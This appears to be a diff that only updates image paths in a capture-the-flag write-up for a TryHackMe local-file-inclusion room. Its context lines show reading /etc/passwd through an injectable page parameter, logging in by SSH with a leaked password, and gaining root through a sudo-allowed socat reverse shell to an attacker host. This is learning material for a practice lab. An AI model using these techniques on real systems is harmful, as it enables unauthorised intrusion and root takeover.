@@ -27,7 +27,7 @@ Room Link: [https://tryhackme.com/room/inclusion](https://tryhackme.com/room/inc
 
 The first and foremost step in any attack is an enumeration. So, gather data about the services running using a **Nmap** scan. 
 
-![1.png](1.png)
+![Inclusion/1.png](1.png)
 
 From the scan results, we can derive that 2 services are running:
 
@@ -38,7 +38,7 @@ From the scan results, we can derive that 2 services are running:
 
 Let's poke at the Webserver and see it's contents.
 
-![2.png](2.png)
+![Inclusion/2.png](2.png)
 
 It seems to be a blog. Explore it and see if anything is interesting to focus on. 
 
@@ -46,7 +46,7 @@ It seems to be a blog. Explore it and see if anything is interesting to focus on
 
 The pages takes in a parameter to the server to display the webpage. Tampering this may disclose files in the webserver causing a LFI attack if the application does not whitelist which files can be included.
 
-![3.png](3.png)
+![Inclusion/3.png](3.png)
 
 Common files to look for : 
 
@@ -62,7 +62,7 @@ and so much more if you're clever.
 
 The passwd file has been exposed. In this, we can observe the users present in the system. 
 
-![4.png](4.png)
+![Inclusion/4.png](4.png)
 
 There is a user named *falconfeast.* The interesting part is that there is a comment which possibly seems like a username and password. Keep in mind, this is a very rare occasion of having the password in the comment, which I believe is deliberately has been done by the creator of the room. After all this room is to understand the basics of LFI. 
 
@@ -77,19 +77,19 @@ So, the next step is to try logging in to the server using SSH.
 
     >> ssh falconfeast@rootpassword 
 
-![5.png](5.png)
+![Inclusion/5.png](5.png)
 
 After logging in the directory has a user.txt file that contains the ***user flag!*** 
 
 Observing the placement of the user.txt, it would be safe to assume the root flag would be in /root folder.
 
-![6.png](6.png)
+![Inclusion/6.png](6.png)
 
 Unfortunately, neither the privilege cannot be escalated nor the /root folder can be accessed directly. But, have a look at the command allowed for *falconfeast* using :
 
     >> sudo -l
 
-![7.png](7.png)
+![Inclusion/7.png](7.png)
 
 It mentions that the user is allowed to run /usr/bin/socat as root with no password required. 
 
@@ -113,7 +113,7 @@ And on the LFI machine, run :
     >> RPORT=12345
     >> socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane
 
-![8.png](8.png)
+![Inclusion/8.png](8.png)
 
 Once you run the command on the LFI machine, the reverse shell must have been successfully created and you can access the machine as *root*. 
 
@@ -123,7 +123,7 @@ To confirm it, run:
 
 Then move into /root folder and list out the items in it. 
 
-![9.png](9.png)
+![Inclusion/9.png](9.png)
 
 The root.txt is present here with the ***root flag!** (Now you can pat yourself :p )*
 
@@ -135,11 +135,11 @@ There is another easy way to read the user and root flag, but I don't think it w
 
 The flags can be accessed directly through the URL if you are familiar with the location of the flags. 
 
-![10extra.png](10extra.png)
+![Inclusion/10extra.png](10extra.png)
 
 User Flag
 
-![11extra.png](11extra.png)
+![Inclusion/11extra.png](11extra.png)
 
 Root Flag
 
